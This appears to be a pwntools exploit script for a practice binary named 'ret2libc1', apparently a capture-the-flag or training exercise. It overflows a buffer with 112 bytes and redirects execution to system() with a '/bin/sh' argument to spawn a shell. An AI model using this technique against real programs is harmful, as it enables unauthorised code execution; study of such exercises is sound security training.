from pwn import *

_bin_sh = 0x08048720
_system = 0x08048611
payload = b"a" * 112 + p32(_system) + p32(_bin_sh)

sh = process("./bin/ret2libc1")
sh.sendline(payload)
sh.interactive()
